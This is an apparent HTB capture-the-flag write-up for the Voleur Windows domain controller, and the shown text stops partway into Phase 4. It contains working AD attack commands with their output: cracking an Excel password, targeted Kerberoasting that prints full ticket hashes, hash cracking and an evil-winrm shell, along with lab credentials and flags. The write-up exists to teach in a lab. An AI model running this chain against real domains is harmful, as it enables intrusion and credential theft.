---
title: "[HTB] Voleur - Advanced Windows Exploitation"
date: 2024-12-01T10:00:00+01:00
draft: false
tags: ["htb", "windows", "hard", "active-directory", "privilege-escalation", "dpapi", "kerberoasting"]
categories: ["writeups", "machines"]
difficulty: ["hard"]
platform: ["htb"]
techniques: ["web-exploitation", "windows-privesc", "service-abuse", "targeted-kerberoasting", "dpapi-extraction"]
description: "HTB Voleur machine walkthrough - Advanced Windows exploitation with service abuse, DPAPI attacks, and privilege escalation"
cover:
    image: "/static/images/writeups/htb/voleur/voleur-banner.png"
    alt: "HTB Voleur Machine"
    caption: "Voleur - HTB Machine Walkthrough by HexHunter404"
author: "HexHunter404"
ShowToc: true
TocOpen: false
weight: 1
---

## **Machine Information**

- **OS:** Windows Server 2022 (Domain Controller)
- **Difficulty:** Medium
- **Initial Credentials:** ryan.naylor:HollowOct31Nyt
- **Domain:** voleur.htb

## **Flags Obtained**

- **User Flag:** 9ead16ec422a36bbec3e8eb539ea2d77
- **Root Flag:** 092ea0c8c50e977873d72cf015ba61d2

---

## **Phase 1: Reconnaissance**

**1.1 Nmap Scan**

```bash
# Nmap 7.95 scan initiated Sat Jul  5 21:39:01 2025 as: /usr/lib/nmap/nmap -sV -sC -A -Pn -n -T4 -p- -vvv -oA voleur_scan --disable-arp-ping --min-rate=1000 10.129.196.199
Nmap scan report for 10.129.196.199
Host is up, received user-set (0.035s latency).
Scanned at 2025-07-05 21:39:02 CEST for 233s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-06 03:41:40Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2222/tcp  open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+vH6cIy1hEFJoRs8wB3O/XIIg4X5gPQ8XIFAiqJYvSE7viX8cyr2UsxRAt0kG2mfbNIYZ+80o9bpXJ/M2Nhv1VRi4jMtc+5boOttHY1CEteMGF6EF6jNIIjVb9F5QiMiNNJea1wRDQ2buXhRoI/KmNMp+EPmBGB7PKZ+hYpZavF0EKKTC8HEHvyYDS4CcYfR0pNwIfaxT57rSCAdcFBcOUxKWOiRBK1Rv8QBwxGBhpfFngayFj8ewOOJHaqct4OQ3JUicetvox6kG8si9r0GRigonJXm0VMi/aFvZpJwF40g7+oG2EVu/sGSR6d6t3ln5PNCgGXw95pgYR4x9fLpn/OwK6tugAjeZMla3Mybmn3dXUc5BKqVNHQCMIS6rlIfHZiF114xVGuD9q89atGxL0uTlBOuBizTaF53Z//yBlKSfvXxW4ShH6F8iE1U8aNY92gUejGclVtFCFszYBC2FvGXivcKWsuSLMny++ZkcE4X7tUBQ+CuqYYK/5TfxmIs=
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMkGDGeRmex5q16ficLqbT7FFvQJxdJZsJ01vdVjKBXfMIC/oAcLPRUwu5yBZeQoOvWF8yIVDN/FJPeqjT9cgxg=
|   256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILv295drVe3lopPEgZsjMzOVlk4qZZfFz1+EjXGebLCR
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52010/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52016/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
52036/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=7/5%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6869803F%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=A)
SEQ(SP=106%GCD=1%ISR=104%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.004 days (since Sat Jul  5 21:36:49 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-07-06T03:42:37
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62173/tcp): CLEAN (Timeout)
|   Check 2 (port 65250/tcp): CLEAN (Timeout)
|   Check 3 (port 43717/udp): CLEAN (Timeout)
|   Check 4 (port 39257/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 8h00m19s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   25.92 ms 10.10.14.1
2   26.78 ms 10.129.196.199

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  5 21:42:55 2025 -- 1 IP address (1 host up) scanned in 234.63 seconds

```

The initial reconnaissance phase began with a comprehensive Nmap scan to identify all open ports and services. 

**Key Services Discovered:**

- **53/tcp (DNS)** - Essential for domain name resolution in Active Directory environments
- **88/tcp (Kerberos)** - Core authentication protocol for Windows domains
- **389/tcp (LDAP)** - Directory services for domain queries and authentication
- **445/tcp (SMB)** - File sharing and administrative access
- **2222/tcp (SSH)** - Unusual service for a Windows DC, suggesting WSL or custom implementation
- **5985/tcp (WinRM)** - Windows Remote Management for PowerShell remoting

The discovery of SSH on port 2222 was particularly noteworthy, as this is atypical for Windows Domain Controllers and suggested the presence of Windows Subsystem for Linux (WSL) or a custom SSH implementation. This would prove crucial in later phases of the attack.

**1.2 Domain Enumeration**

```bash
# Time synchronization
ntpdate voleur.htb

# Basic LDAP enumeration
ldapsearch -x -H ldap://10.129.196.199 -D "ryan.naylor@voleur.htb" -w 'HollowOct31Nyt' -b "dc=voleur,dc=htb" "(objectClass=*)" -s base

```

Domain enumeration began with time synchronization using `ntpdate`, which is critical for Kerberos authentication as it requires synchronized clocks between client and server (typically within 5 minutes). The LDAP enumeration provided initial validation of the provided credentials and confirmed the domain structure. This baseline enumeration established the foundation for more detailed reconnaissance using specialized tools.

**1.3 BloodHound & ldap Collection**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# ntpdate voleur.htb && impacket-GetADUsers -all 'voleur.htb/ryan.naylor:HollowOct31Nyt' -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb 
2025-07-06 06:07:16.595561 (+0200) +28808.566181 +/- 0.011743 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28808.566181
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying dc.voleur.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2025-01-28 21:35:13.766711  2025-07-06 05:38:12.746180 
Guest                                                 <never>              <never>             
krbtgt                                                2025-01-29 09:43:06.152684  <never>             
ryan.naylor                                           2025-01-29 10:26:46.368695  2025-07-06 06:04:52.387272 
marie.bryant                                          2025-01-29 10:21:07.540658  <never>             
lacey.miller                                          2025-01-29 10:20:10.758901  <never>             
svc_ldap                                              2025-01-29 10:20:54.900094  2025-01-31 10:37:45.081360 
svc_backup                                            2025-01-29 10:20:36.962381  2025-07-06 05:38:00.277418 
svc_iis                                               2025-01-29 10:20:45.883878  <never>             
jeremy.combs                                          2025-01-29 16:10:32.242480  2025-01-30 12:51:02.392951 
svc_winrm                                             2025-01-31 10:10:12.398769  2025-01-29 16:07:32.711487 

┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# ntpdate voleur.htb && impacket-GetADComputers 'voleur.htb/ryan.naylor:HollowOct31Nyt' -dc-ip $ip -k -no-pass -dc-host dc.voleur.htb
2025-07-06 06:08:06.505565 (+0200) +28808.098908 +/- 0.010521 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28808.098908
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying dc.voleur.htb for information about domain.
SAM AcctName     DNS Hostname                         OS Version       OS                   
---------------  -----------------------------------  ---------------  --------------------
DC$              DC.voleur.htb                        10.0 (20348)     Windows Server 2022 Standard 
```

**Kerberos setting**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# ntpdate $ip && nxc smb  $ip -u ryan.naylor -p 'HollowOct31Nyt' --generate-krb5-file /tmp/krb5.conf 
2025-07-06 06:02:52.274677 (+0200) +28828.481068 +/- 0.010524 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28828.481068
SMB         10.129.196.199  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                  
SMB         10.129.196.199  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
                                                                                                                   
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# cat /tmp/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB

┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# export KRB5_CONFIG=/tmp/krb5.conf                              
                                                                                                                   
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# kinit ryan.naylor                
ryan.naylor@VOLEUR.HTB's Password: 
                                                                                                                   
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# klist            
Credentials cache: FILE:/tmp/krb5cc_0
        Principal: ryan.naylor@VOLEUR.HTB

  Issued                Expires               Principal
Jul  6 06:04:52 2025  Jul  6 16:04:52 2025  krbtgt/VOLEUR.HTB@VOLEUR.HTB
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# export KRB5CCNAME=/tmp/krb5cc_0   
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# bloodhound-python -u ryan.naylor -d voleur.htb -dc dc.voleur.htb -c All --zip

```

BloodHound collection represents a critical escalation in reconnaissance sophistication. By configuring Kerberos properly and obtaining a Ticket Granting Ticket (TGT) with `kinit`, we established authenticated access to the domain. The `bloodhound-python` collector then systematically enumerated domain objects, relationships, and permissions that would be invisible to traditional scanning methods.

**Key Findings:**

- **Domain:** voleur.htb
- **Users:** ryan.naylor, marie.bryant, lacey.miller, jeremy.combs, svc_ldap, svc_winrm, svc_backup
- **Group:** First-Line Technicians (ryan.naylor is member)

The discovery of multiple service accounts (svc_ldap, svc_winrm, svc_backup) immediately suggested potential privilege escalation paths, as service accounts often have elevated permissions and may be vulnerable to Kerberoasting attacks.

![Ryan Naylor on Bloodhound](/static/images/writeups/htb/voleur/ryan.png)

---

## **Phase 2: Initial Access**

**2.1 SMB Share Enumeration (Success with Kerberos)**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# ntpdate voleur.htb && nxc smb 10.129.196.199 -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -k --shares
2025-07-06 06:25:00.534568 (+0200) -0.001658 +/- 0.013549 voleur.htb 10.129.196.199 s1 no-leap
SMB         10.129.196.199  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.196.199  445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         10.129.196.199  445    DC               [*] Enumerated shares
SMB         10.129.196.199  445    DC               Share           Permissions     Remark
SMB         10.129.196.199  445    DC               -----           -----------     ------
SMB         10.129.196.199  445    DC               ADMIN$                          Remote Admin
SMB         10.129.196.199  445    DC               C$                              Default share
SMB         10.129.196.199  445    DC               Finance                         
SMB         10.129.196.199  445    DC               HR                              
SMB         10.129.196.199  445    DC               IPC$            READ            Remote IPC
SMB         10.129.196.199  445    DC               IT              READ            
SMB         10.129.196.199  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.196.199  445    DC               SYSVOL          READ            Logon server share 

```

The successful authentication using Kerberos (`-k` flag) confirmed that the domain controller required Kerberos authentication for SMB access. This is a security best practice that prevents pass-the-hash attacks and ensures all authentication is properly logged and audited.

**Accessible Shares:**

- **IT (READ)** - Departmental share likely containing technical documentation
- **NETLOGON (READ)** - Standard domain share for logon scripts
- **SYSVOL (READ)** - Standard domain share for policies and scripts

The IT share was particularly interesting as it suggested access to technical documentation and potentially sensitive information related to system administration.

**2.2 IT Share Exploration**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# ntpdate voleur.htb && impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb -target-ip 10.129.196.199
2025-07-06 06:53:36.978238 (+0200) +28799.386157 +/- 0.162155 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.386157
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Mon Jun 30 23:08:33 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 00:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# exit

```

The exploration of the IT share revealed a structured organization with folders corresponding to different support tiers. The "First-Line Support" folder contained an Excel file named "Access_Review.xlsx", which suggested periodic access reviews - a common security practice that often contains sensitive credential information.

**2.4 Excel File Analysis**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur] 
└─# office2john Access_Review.xlsx > excel_hash.txt

┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur] 
└─# john --wordlist=/home/hexhunter404/Downloads/rockyou.txt excel_hash.txt 
Using default input encoding: UTF-8 Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES]) Cost 1 (MS Office version) is 2013 for all loaded hashes 
Cost 2 (iteration count) is 100000 for all loaded hashes 
Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status 
football1 (Access_Review.xlsx)
1g 0:00:00:06 DONE (2025-07-05 23:05) 0.1459g/s 114.4p/s 114.4c/s 114.4C/s football1..lolita Use the "--show" option to display all of the cracked passwords reliably 
Session completed.
```

**Password:** football1

The Excel file was password-protected with a weak password ("football1"), demonstrating poor security practices. This type of weak password protection is common in corporate environments where users prioritize convenience over security.

**Critical Information Discovered:**

- **svc_ldap:** M1XyC9pW7qT5Vn (LDAP Services)
- **svc_iis:** N5pXvW1VqM7CZ8 (IIS Administration)
- **todd.wolfe:** NightT1meP1dg3on14 (Account to be deleted)
- **ryan.naylor:** "Has Kerberos Pre-Auth disabled temporarily"

![Excel sheet content](/static/images/writeups/htb/voleur/image.png)

The access review spreadsheet contained a treasure trove of sensitive information, including plaintext passwords for multiple service accounts. The note about todd.wolfe's account being scheduled for deletion was particularly significant, as deleted accounts often retain valuable data. The notation about ryan.naylor having Kerberos Pre-Authentication disabled temporarily indicated a potential AS-REP roasting vulnerability.

---

## **Phase 3: Privilege Escalation**

**3.1 Service Account Authentication**

```bash
# Test svc_ldap credentials
nxc smb 10.129.196.199 -u svc_ldap -p 'M1XyC9pW7qT5Vn' -d voleur.htb -k

```

The successful authentication with the svc_ldap service account marked a significant escalation in privileges. Service accounts typically have elevated permissions within Active Directory environments, as they need to perform various automated tasks and services.

**3.2 BloodHound Analysis**

**Key Discovery:** svc_ldap has WriteSPN permission on svc_winrm

![WriteSPN](/static/images/writeups/htb/voleur/writespn.png)

BloodHound analysis revealed that svc_ldap possessed WriteSPN (Write Service Principal Name) permissions on the svc_winrm account. This permission allows modification of Service Principal Names, which can be exploited to perform targeted Kerberoasting attacks. This relationship represents a classic example of how complex Active Directory permissions can create unintended privilege escalation paths.

**3.3 Targeted Kerberoasting (cf.** [https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting](https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting#targeted-kerberoasting))

```bash
┌──(root㉿kali)-[/home/…/Machines/Season8/Voleur/targetedKerberoast]
└─# ntpdate voleur.htb && ./targetedKerberoast.py -v -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' --dc-ip 10.129.196.199 --dc-host dc.voleur.htb -k
2025-07-06 07:46:00.880780 (+0200) +28801.753306 +/- 0.009549 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28801.753306
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$9c71ef22710b4dbcd38d56204182f6d2$8631661121f089f3c4c2aea4867a92b124e862894f2c44d9274a20cb2dc216090b9abf4b2610d92db623e8f3594b7ccdfcf66efb2d7fd868451b1b7637167004cbe7fc2da9c1179dd0ca44450df6397164fb3b0ecd4ecc4bf9c1e9113f1b79de3b93a74172ce2e32103175de5830dbc90e2af9e9fa47c624e2bf69a7c61eccad388a8d4c6dfbf37115ca34974e8229fa4d71dcb9ecc0c80db4f9a834ead0907a3542740dec01c45f0da40b246a56813c304dc19e05f32de23e852c7b5fb3668c2c39f921c0a6075a7a4a43295ddbbff4854b1d9135877a718e1d6617b308359fe4ef4280d3580975f2ee4b1f2b1f3049ba73fb8c4e897e700075a8e96dfe603eb9f7dd251f69a9ad7fbe0829ffdbde587ca9cac8c902a895e093e5488796fff1797186d78b5c46ea74882045a881a8d69d2797de0d90b1780b8cb570fe3b7af418dc2fe58cd2f899623f7ee6f4f465578eb87e3b1242550125cda53a5f532f07aba674a83a420c283cdab8ca7a3e82c5d21b4d5ee1599796e88e872913337a4024eee1796f9c3e0c87c779d61eb0f169e8337fec6b38ea491b6d9e51c5f7f7f99f93795aad3e40976972599f29626bf9d3df33a0349d6dc9487bb68ba4b0340900addb6f6eb492b27c2db1285fb045922c2fc9bf2d8226c77034b04ae1951946fae3d5e2844d8f96f7affefa21b28d900f74d8e223c6dcc51cdd9bff150f94e271fa1b0bfb9d845cb37cd71ae8b0e1cc3dcacf0e89809d211146d94873527d6b6b99b5e12bfebc62839387a973800096a8886d5e12352e678655503a0e1e792cfbc5f139120dd59a10d7675d9a48eccdaa76322723cfbe7dcecd8165890ad17bad4219904df285a45dcfed917fedca4031a84580cd8da72056b9d43fb63563ebe4c9e9d79bb234f96b4230648098a6a0159aa8348f14e678a6a4301f93b0c69e77beb9d6c6a01dcdf02b6b75ba55cbb8c4fdc6717c865fcb3cbdd98b938cd52e322f4eb78a549d44f038ff73a09c82a2d680a2a2eb1a07ee2d974484072e61a5bf921356b30d999b5364b6e3881b4d4a6ab7aadaea0be836006c30f2ea77084d8b862d540227f3bc32a6a3da11ddbd2fb4f37105ac5c0ae33293a7706bdb759fdf01ff086e4262f695e86fd3c8597686e2828474400669df3a94e2dc5afa268972bc81ac7d680736d8e60f9e23757a2e12df46f3cd3a689000aca324ad0b97c2cd41a530922ecc4ff68e339ea5fb622694aec219c99ae2f4bc1c3dde7e725f5fb081d8c844fdb8da7bf9219dab333781f61d8dcb805c7483ef3eb30d0fc91c4d5d2962f907377f310d958ada60c8791ec4891eb194576658ccf03b42dc8422f2ac09e34965304fbabf7c6069f236c1ee8c14468d5ee673f6ec0a7272e7f48310e720e95582440b61202367b20c4da0ca32da9f31740f76e0eb4bd0d412738f7f
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$ba33b773e1d5a82f61955402b1b03c4e$76acd3c2fb0001ffdfdbbddb41ce2175310196cf81c359738b595b27e4b6aeb9a713035cc1d3f4c03d73e4fa41c75e9cdfb60bebfd07e586a1e74df4be7cb685cedad8fd28748b35f2730fd4bc65915938dde8ff8779729d7097d4ee5b8683c476b3fc79d8b84255c656a7a9fc3b9d0ee0c7eba6834d29bc4a88c48d7672df9432feae96268981c6258d51d1764861a57b19997b06e8d47b50f113c68c520c037d6559591ab0a63e18694fc22c9e3df3457d7d3e0b2cd8e285110fb48696cee4802dede3a44cd1be77230f94d2522f4d7abe418b5404a44cd27d6c22235cd30971a2fefbc9f7c2c5e1bb31e1ccfd9a70a5d8cf9db1c5e1981e0c788c5242c0e163a31c93b3f658e25c1a63968d0f1b16b0b67aec3a9fe662a8d67117cc95efc7baf68208312b3e7cf58aacae52db3cddc343737d61a2f93d7166aef05149003ed843b447156f605dff71c1d9d38fc52ff062d588914d2edb1e6daf6d60a2d31f1ed32716a2832f56b9c0422fa657cd551152546c5f57ef35a756f9eb9d9fa1cd4d6d893633f87413db436db87730d3cd18659e26511ef9bff55b90a3449ca170d53fac4d4bf7af2aceead7d3b9a57d68bdd0b8ce17883cba72dc2f995d830f58d08499e4ec79f422e0e35e76bdb73e55fdc386d65cd3aa6d0539e4d3c7aa738209aa8b2fb9fba7f15e4b109a390b7d169a47394ad9258122c0ccd60ff30b9d03a7b9125ddf77743ceddfdcdfd98f88a5a31e0e6ce817784294075c368f4410c88e8b9ea8a8293c138187346f938d853feb490291c7923d7fda729e0b2148e201ff4266ef655d262c81abb24dac81154702dbf2a86b91d1bf0917d66824c16775f6e740951cf27e3f3e2a32ae669e84eedd447c4a3c8795ff835ae5d86d61d8bb16480751ffe869e37af4e06aea6f220de0aae54f775da903a6bd70b022a3a6360d8858de45e4110735d823153daf54a6652c71b1f9e0a1185bf4266d2016719d45de57bcd5d56942774848fbe58a4ca3d08c36c6782de9233aee865dc367439ead0d6d7e969b703151ffe8062055d0df4ae38e648d4c750f2e37f98bf86f4e8f33bb214cc7650c6e140fcaa9d6eb28a4015f404ff6186eae9d5bf0750d5576344e037c541eaad33b990f4c2b89f2a144a8b5953eb46d29760f7d3586e8be1b4d40b1ab44cab60675370a3b1d4000f7ba5c702244577abc63955b6279135578a4b8b319d91b8836efcd56c51cee39efaede7f90f63d0f9df8e340047fae229947ec206ecd606bf595544524261a34d50047c4947b293fb2d040f272b5fc0af01bfed543c95a8d68c1e6333ea485b44e474df491a19653ea7eb8464d73b6fdcbce1107f2cc523fa866107e083e28cddd42f38775308190c625e77fa83a437c0ed9fab68586ab66d37816cb7a7b38532f868be88e8eb5e46241db403de30ed9bb96
[VERBOSE] SPN removed successfully for (svc_winrm)

```

The targeted Kerberoasting attack leveraged the WriteSPN permission to set arbitrary Service Principal Names on target accounts, then requested Kerberos service tickets for these accounts. This technique allows attackers to obtain encrypted ticket-granting service tickets that can be cracked offline to recover plaintext passwords.

**Hashes Retrieved:**

- **lacey.miller:** *krb*5*tgs*23∗*lacey*.*miller*...
    
    krb5tgs
    
    ∗lacey.miller
    
- **svc_winrm:** *krb*5*tgs*23∗*svcwinrm*...
    
    krb5tgs
    
    ∗svcwinrm
    

The successful extraction of Kerberos ticket hashes for both lacey.miller and svc_winrm provided offline cracking targets. These Type 23 tickets use RC4 encryption, which is more vulnerable to cracking than newer encryption methods like AES.

**3.4 Hash Cracking**

```bash
┌──(root㉿kali)-[/home/…/HTB_Challenges/Machines/Season8/Voleur]
└─# john --wordlist=/home/hexhunter404/Downloads/rockyou.txt svc_winrm_hash.txt --format=krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:08 DONE (2025-07-05 23:48) 0.1117g/s 1281Kp/s 1281Kc/s 1281KC/s AHAMDAKMAL..AFIROCKS!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

**Password Found:** AFireInsidedeOzarctica980219afi

The recovered password "AFireInsidedeOzarctica980219afi" appeared to be a combination of song lyrics or band name with additional characters, representing a common pattern where users create passwords they consider complex but are still vulnerable to wordlist attacks.

**3.5 WinRM Access**

```bash
┌──(root㉿kali)-[/home/hexhunter404]
└─# ntpdate voleur.htb && impacket-getTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi 
2025-07-06 06:45:25.382677 (+0200) +28799.807445 +/- 0.013519 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28799.807445
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
┌──(root㉿kali)-[/home/hexhunter404]
└─# ntpdate voleur.htb && evil-winrm -i DC.voleur.htb -r VOLEUR.HTB
2025-07-06 06:46:56.688599 (+0200) +28803.921600 +/- 0.013948 voleur.htb 10.129.196.199 s1 no-leap
CLOCK: time stepped by 28803.921600
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> dir

    Directory: C:\Users\svc_winrm\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          7/5/2025   8:38 PM             34 user.txt

*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
9ead16ec422a36bbec3e8eb539ea2d77

```

The successful WinRM connection established interactive PowerShell access to the domain controller. WinRM access provides significant capabilities for system administration and reconnaissance, as it allows execution of PowerShell commands with the privileges of the authenticated user.

**User Flag Retrieved:** 9ead16ec422a36bbec3e8eb539ea2d77

---

## **Phase 4: DPAPI Exploitation**

I started looking around and found that there is a folder beloging to todd.wolfe in C:\Users but inaccessible with svc_winrm as well as the share C:\IT

I tried to see the deleted users but didn’t have the required privileges with svc_winrm

**4.1 Custom Runas Tool**

```bash
*Evil-WinRM* PS C:\Users> dir

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
